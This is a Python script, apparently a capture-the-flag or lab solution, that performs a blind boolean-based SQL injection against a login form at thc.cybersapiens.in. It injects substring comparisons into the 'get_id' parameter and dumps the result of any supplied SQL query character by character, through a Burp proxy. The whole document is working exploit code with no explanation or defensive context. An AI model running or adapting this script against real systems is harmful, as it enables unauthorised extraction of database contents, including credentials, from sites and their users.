#!/usr/bin/env python3

import requests
import string
from pwn import *
import sys


burpsuite = {'http': 'http://127.0.0.1:8080'}
headers = {'Content-Type': "application/x-www-form-urlencoded"}
characters = string.digits + string.punctuation + string.ascii_letters
characters = characters.replace("&", "") # avoid weird behaving chars
characters = characters.replace("+", "")
url = 'http://thc.cybersapiens.in/login/'


def ctrl_c(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit()

# trap ctrl+C
signal.signal(signal.SIGINT, ctrl_c)


def sqli(query): 
    p1 = log.progress("Dumped")
    dumped = ''
    position = 1
    while True:
        for c in characters:
            data = f"get_id=1' and substring(({query}),{position},1)='{c}'-- -&search_by_id="
            r = requests.post(url, headers=headers, proxies=burpsuite, data=data, allow_redirects=False)

            if "WiFi Pineapple" in r.text:
                position += 1
                dumped += c
                p1.status(dumped)
                break

            if c == characters[-1]:
                p1.success(dumped)
                sys.exit()


def main():
    # check a query is received
    if len(sys.argv) != 2:
        print(f"\n[!] Usage: {sys.argv[0]} <query_to_execute>\n")
        sys.exit(1)

    query = sys.argv[1]
    sqli(query)


if __name__ == "__main__":
    main()
